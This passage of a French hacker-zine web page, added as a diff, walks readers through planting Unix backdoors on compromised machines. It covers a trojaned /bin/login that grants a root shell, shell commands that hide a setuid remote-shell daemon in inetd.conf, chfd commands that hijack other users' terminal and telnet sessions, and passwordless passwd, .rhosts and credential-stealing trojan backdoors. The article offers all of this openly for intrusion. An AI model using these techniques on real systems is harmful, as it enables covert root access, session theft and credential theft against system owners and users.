+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"> <u><b>Backdoor 
+  login</b></u><br>
+  <br>
+  Cette backdoor est tres interessante puisqu'elle nous permet de gagner un access 
+  et aussi de passer root (et oui, les deux en meme temps). Le fichier /bin/login 
+  est un executable lance a chaque connexion telnet entrante et a chaque fois 
+  qu'un user veut se logguer : login se lance au demarrage et fait une demande 
+  d'authentification et ensuite realise les operations necessaires au lancement 
+  correct du reste des applications (shells,...). Malheureusement, vu la taille 
+  du fichier source de login, il m'est impossible de vous decrire<br>
+  avec precision comment il fonctionne et comment installer la backdoor. En gros, 
+  il suffit de rajouter une commande qui fait que si vous entrez un certain login 
+  et un certain password, /bin/login vous file un shell root et bien sur UID 0 
+  (vraiment pas difficile a coder). Sinon, pour le faire, je suis quand meme charitable 
+  (arf :) je vous file <a href="bin/login.c" target="_self">login.c</a></font></p>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><b><u>Backdoor 
+  serveur</u></b><br>
+  <br>
+  Cette door requiert des connaissances de bases en programmation reseau (oh, 
+  tiens, ca tombe bien : un article de ce mag en parle :). Le but est simple : 
+  nous allons coder un serveur qui ouvre le port 35789 (par exemple) et qui accepte 
+  des commandes shell en remote (en clair, un telnetd sur un port autre que le 
+  23 et qui saute l'authentification). Je ne donnerai pas d'exemple de code d'une 
+  telle backdoor car il suffit d'aller lire l'article sur la prog reseau si vous 
+  n'y connaissez rien ou d'aller D/L celle que Alecs est en train de faire une 
+  fois qu'elle sera finie. Neanmoins, je vais vous montrer comment la laisser 
+  active, meme si la machine reboot pour une raison ou une autre. Deja, nous n'allons 
+  pas la cacher comme les autres backdoor : on va la planquer au milieu des autres 
+  demons, a savoir dans le repertoire /usr/sbin/. Ensuite, on va la nommer avec 
+  un nom a la con qui passe bien (du style userd). Enfin, on va la rajouter dans 
+  le fichier inetd.conf. Inetd est la GRAND demon des systemes UNIX : au lieu 
+  d'utiliser 15000 demons tournant en meme temps chacun ecoutant sur son port, 
+  UNIX utilise un seul demon qui ecoute tous les ports et qui lance le demon d'un 
+  port specifique qu'en cas de besoin (c'est-a-dire lorsqu'une connexion arrive 
+  sur le port en question). Les differents ports que gere inetd et la maniere 
+  dont il les gere est stockee dans le fichier /etc/inetd.conf. Le truc va etre 
+  donc de rajouter notre backdoor dans les<br>
+  entrees de inetd... Par exemple : (les # ne sont pas a tapper)</font></p>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"> <font color="#333333">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# 
+  gcc -o backdoor backdoor.c /* on compile la backdoor */<br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# chmod a+s /* on se la rend suid 
+  ca peut toujours servir */<br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# rm backdoor.c /* on vire notre source 
+  */<br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# mv ./backdoor /usr/sbin/userd /* 
+  on la bouge en la renommant */<br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# cat /etc/inetd.conf /* on matte 
+  le fichier inetd.conf */<br>
+  &lt;---------------------------[inetd.conf]--------------------------------------&gt;<br>
+  # valuable to potential &quot;system crackers.&quot; Many sites choose to disable<br>
+  # some or all of these services to improve security.<br>
+  #<br>
+  # cfinger is for GNU finger, which is currently not in use in RHS Linux<br>
+  #<br>
+  finger &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;stream &nbsp;&nbsp;&nbsp;tcp &nbsp;&nbsp;nowait 
+  &nbsp;&nbsp;root &nbsp;&nbsp;&nbsp;/usr/sbin/tcpd in.fingerd<br>
+  #cfinger &nbsp;&nbsp;&nbsp;stream &nbsp;&nbsp;&nbsp;tcp &nbsp;&nbsp;nowait &nbsp;&nbsp;root 
+  &nbsp;&nbsp;&nbsp;/usr/sbin/tcpd in.cfingerd<br>
+  #systat&nbsp;&nbsp; &nbsp;&nbsp;stream &nbsp;&nbsp; tcp &nbsp;&nbsp;nowait &nbsp;&nbsp;guest 
+  &nbsp;/usr/sbin/tcpd /bin/ps -auwwx<br>
+  #netstat &nbsp;&nbsp;stream &nbsp;&nbsp;&nbsp;tcp &nbsp;&nbsp;nowait &nbsp;&nbsp;&nbsp;guest 
+  &nbsp;/usr/sbin/tcpd /bin/netstat -f inet<br>
+  #<br>
+  # Time service is used for clock syncronization.<br>
+  #<br>
+  time &nbsp;&nbsp;&nbsp;&nbsp;stream&nbsp;&nbsp;&nbsp; tcp&nbsp;&nbsp;&nbsp; 
+  &nbsp;nowait &nbsp;&nbsp;nobody &nbsp;&nbsp;/usr/sbin/tcpd in.timed<br>
+  time &nbsp;&nbsp;&nbsp;&nbsp;dgram&nbsp;&nbsp;&nbsp;&nbsp; udp &nbsp;&nbsp;&nbsp;&nbsp;wait 
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nobody &nbsp;&nbsp;/usr/sbin/tcpd in.timed<br>
+  #<br>
+  # Authentication<br>
+  #<br>
+  auth &nbsp;&nbsp;&nbsp;stream &nbsp;&nbsp;&nbsp;&nbsp;tcp &nbsp;&nbsp;&nbsp;&nbsp;nowait 
+  &nbsp;&nbsp;nobody &nbsp;&nbsp;/usr/sbin/in.identd in.identd -l -e -o<br>
+  #<br>
+  # End of inetd.conf<br>
+  (PS: je mets que la fin du file, le but est d'en voir la gueule pas le contenu)<br>
+  &lt;-----------------------------------------------------------------------------&gt;<br>
+  # echo &quot;user stream tcp nowait nobody /usr/sbin/userd&quot; &gt;&gt; inetd.conf 
+  /* on rajoute notre door dans les entrees de inetd */<br>
+  # killall -HUP inetd /* on met a jour inetd */<br>
+  # exit /* le job est finit, on s'arrache */</font></font></p>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Bon, en gros vous 
+  aurez pige le principe. Si vous voulez paraitre encore moins<br>
+  louche vous pouvez aussi editer /etc/services.</font></p>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"> <u><b>HiJacking 
+  de session</b></u><br>
+  <br>
+  A la base ceci n'est pas du tout une backdoor, mais on peut l'utiliser comme 
+  tel. Son gros defaut est que, pour qu'elle soit efficace, il faut qu'un autre 
+  user soit connecte au reseau (en local et en root de preference). Le but va 
+  etre de hijacker la session de l'autre user en utilisant les descripteurs de 
+  fichiers (voir Phrack 51, &quot;File Descriptor HiJacking&quot; de orabidoo 
+  pour plus de precisions). Il est a noter que la methode presentee ne fonctionnera 
+  que sur Linux ou FreeBSD...</font></p>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"> Chaque fichier 
+  manipule par un processus est identifie localement dans celui-ci par un descripteur 
+  qui est un indice dans une table propre au process. Les descripteurs de fichiers 
+  les plus courants sont :<br>
+  </font><font face="Verdana, Arial, Helvetica, sans-serif" size="2"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;* 
+  le descripteur 0, qui correspond a l'entree standard<br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;* le 
+  descripteur 1, qui correspond a la sortie standard<br>
+  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;* le 
+  descripteur 2, qui correspond a la sortie erreur standard<br>
+  Pour chaque processus, le noyau a une table de FDs (=file descriptors, descripteurs 
+  de fichiers) avec un pointeur pointant vers une structure pour chaque fd. Ces 
+  pointeurs valent NULL si le fd qui leur est associe n'est pas ouvert. La structure, 
+  elle, avec des pointeurs, sert a stocker des infos sur le fd (si c'est un fichier, 
+  un socket, une pipe (ou un?), la table d'inode du fichier...).<br>
+  Generalement, la table des processus est un tableau ou une liste de structure 
+  liee. On peut facilement trouver un pointeur pointant vers la table de fd interne 
+  d'un process donne a partir de la structure de ce process. Pour plus d'infos 
+  sur ces tables, regardez sched.h sous Nux ou proc.h sous BSD.</font></p>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"> Bon, je vais vous 
+  epargner les details techniques puisqu'on est la pour parler de backdoors et 
+  de rien d'autre, si vous avez besoin de ces details, allez lire phrack. En gros, 
+  le principe de notre backdoor va etre de permettre d'echanger le fd d'un process 
+  avec celui d'un autre process. Pour cela, nous allons utiliser chfd (change 
+  file descriptors) dont les sources sont livrees dans l'article de Phrack. Compilez 
+  ce prog puis mettez le SUID root et planquez le a cote des chown, chgrp, chmod 
+  et autres tout en le mettant a la meme date que ces derniers (voir plus haut). 
+  Voila pour la planque, maintenant voyons l'utilisation :</font></p>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"> <u>Utilisation 
+  1</u><br>
+  Un user est tranquillement en train de bosser sur un TTY avec un shell de type 
+  BASH de PID 5315. Nous, on est sur un TTY avec un shell de type BASH de PID 
+  5106. Voila ce que nous allons faire pour hijacker la session de l'autre user 
+  :</font></p>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"> <font color="#333333">$ 
+  cat &gt; fd<br>
+  sleep 10000<br>
+  chfd 5315 0 0 0 5106 0<br>
+  chfd 5315 1 0 0 5106 1<br>
+  chfd 5315 2 0 0 5106 2<br>
+  ^C<br>
+  $ fd</font></font></p>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Et nous voila avec 
+  la session de l'autre user redirigee entierement vers nous. Son entree standard 
+  est redirigee vers la notre, sa sortie standard est redirigee vers notre sortie 
+  standard et sa sortie erreur standard est redirigee vers notre sortie erreur 
+  standard : comme si on avait pousse l'user de sa machine pour s'y installer 
+  a sa place. Pendant que vous controlerez son BASH, tout ce que le mec tappera 
+  ira au /dev/null :),(pas la peine de vous preciser ce que ca veut dire :). Quand 
+  vous ferez un chtit exit, vous reviendrez a votre shell de depart, sur le sleep 
+  10000 que vous n'aurez plus qu'a terminer (^C).</font></p>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"> <u>Utilisation 
+  2</u><br>
+  Cette utilisation n'est pas une backdoor mais je la met quand meme car elle 
+  est bien utile. Imaginez qu'un user soit en plein Telnet vers un autre reseau, 
+  Telnet qui a pour PID le numero 2300. Pour se farcir ledit reseau se serait 
+  pratique d'etre a la place du gars puisque lui y a un acces... Et ben on va 
+  lui balancer un chfd dans les dents, pour se retrouver a sa place et du coup 
+  profiter de son acces. Nous allons nous aussi lancer un Telnet, vers un serveur 
+  lointain, sur le port 7 (port echo) qui aura pour PID 1235. Seulement un probleme 
+  se pose : on connait le numero de FD des entree, sortie et sortie erreur standards 
+  mais on n'a pas le FD de la connexion telnet. Pas de panique! Un ptit cat sur 
+  /proc/1235/fd et /proc/2300/fd nous dira ce qu'il nous faut. Si on voit l'utilisation 
+  des fds 0,1,2 et 3, comme on sait a quoi correspondent 0, 1 et 2 on en deduit 
+  que 3 correspond a la correction...et roule ma poule! La on peut faire peter 
+  : $ chfd 2300 3 1235 3 0 0. Hopla, on a tout!</font></p>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"> <u><b>Backdoors 
+  classiques</b></u><br>
+  <br>
+  Ok, ici je vais vous presenter deux ou trois backdoors tres classiques. Perso, 
+  je ne les trouve pas dementes mais elles peuvent toujours servir :</font></p>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"> <font color="#333333"><i>/etc/passwd</i></font><br>
+  </font><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Le truc ici 
+  est de rajouter un autre user dans le /etc/passwd, le tout sans mot de passe 
+  de preference et avec un bel acces. Le probleme est que cela se rode a 300Km, 
+  puisque le /etc/passwd est souvent controle par les admins quand ces derniers 
+  n'ont pas ecrit un programme qui le fait a leur place.</font></p>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2" color="#333333"> 
+  <i>rlogin</i></font><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><br>
+  Encore un truc voyant. La on installe un access sur une RPC (remote procedure 
+  call). Le but est de faire un &quot;cat &quot;+ +&quot;&gt; .rhosts&quot; dans 
+  le repertoire personnel d'un user. Pour revenir sur le reseau, on n'aura plus 
+  qu'a faire un &quot;rlogin victim.com -l nom_du_user&quot; ou nom_du_user est 
+  le login de l'account auquel vous avez mis un .rhosts dans le repertoire personnel. 
+  Cela necessite que le port login soit ouvert.</font></p>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2" color="#333333"><i> 
+  troyen</i></font><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><br>
+  C'est un script ou un programme place dans le repertoire personnel d'un user 
+  qui sera bien voyant avec un nom explicite : du style SECURITE. Vu que cela 
+  touche un domaine important, l'user va executer SECURITE. Les effets peuvent 
+  etre variables : ca peut simuler un reboot puis un login prompt pour que les 
+  infos tappees par l'user vous soit mailees,...</font></p>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"> Il existe d'autres 
+  doors bien classiques, en faire la liste serait trop long...</font></p>
+<p><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><b><u>Conclusion</u></b><br>
+  <br>
+  Voila, c'est tout pour cet article qui avait pour but de vous presenter une 
+  ou deux backdoors histoire de vous donner des idees. J'espere que ca vous servira 
+  par la suite. Si vous avez des questions, des commentaires, des remarques ou 
+  des erreurs a me signaler (car des erreurs il y a c'est sur) : <a href="mailto:judicious@tipiak.net">judicious@tipiak.net</a></font></p>
+</body>
+</html>
